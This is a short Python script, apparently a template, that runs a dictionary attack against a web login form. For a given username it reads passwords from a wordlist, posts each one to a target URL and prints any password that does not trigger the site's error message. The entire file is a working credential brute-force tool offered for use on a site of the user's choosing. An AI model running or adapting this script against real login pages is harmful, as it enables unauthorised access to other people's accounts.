#!/usr/bin/env python
import requests

def login(user,password,url):
    data ={"username": user, "password": password, "Login":"submit" }
    return requests.post(url, data=data, allow_redirects=True)


error_login="Web page custom error login"
dictionary="your_dict"
user="user for testing"
target_url="url to attck"

with open(dictionary, "r") as wordlist_file:
    for password in wordlist_file:
        response =login(user,password,target_url)
        if error_login not in response.content:
            print("\t [+] login succes with credentials ==> "+password)